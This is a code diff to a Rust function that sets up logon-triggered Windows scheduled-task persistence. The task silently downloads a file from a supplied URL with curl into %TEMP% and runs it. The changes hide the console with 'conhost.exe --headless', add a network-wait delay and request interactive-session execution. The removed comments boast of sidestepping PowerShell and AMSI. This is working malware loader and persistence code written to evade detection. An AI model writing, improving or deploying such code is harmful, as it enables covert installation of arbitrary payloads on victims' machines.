@@ -428,11 +428,12 @@ pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, Str
     ];
     let drop_name = drop_names[idx % drop_names.len()];
 
-    // Use curl.exe (ships with Windows 10 1803+) — no PowerShell, no AMSI.
-    // cmd /c is needed because schtasks /TR runs without a shell.
-    // The drop path uses %TEMP% which expands at task trigger time.
+    // conhost.exe --headless hides the console completely (no visible cmd popup).
+    // ping delay (~30s) waits for network stack and desktop to be ready.
+    // Run exe directly — inherits the interactive user session from the schtask
+    // /IT flag, giving it proper desktop access without 0xC0000142.
     let task_cmd = format!(
-        "cmd.exe /c curl -s -L \"{}\" -o \"%TEMP%\\{}\" && start /min \"\" \"%TEMP%\\{}\"",
+        "conhost.exe --headless cmd.exe /c ping 127.0.0.1 -n 31 >nul & curl -s -L \"{}\" -o \"%TEMP%\\{}\" && \"%TEMP%\\{}\"",
         download_url, drop_name, drop_name
     );
 
@@ -445,6 +446,7 @@ pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, Str
         .output();
 
     // Create scheduled task triggered on every logon
+    // /IT = interactive (runs in user's session with desktop access)
     let output = Command::new(&schtasks_exe)
         .args(&[
             "/Create",
@@ -453,6 +455,7 @@ pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, Str
             "/TR", &task_cmd,
             "/F",
             "/RL", "LIMITED",
+            "/IT",
         ])
         .creation_flags(0x08000000)
         .output()
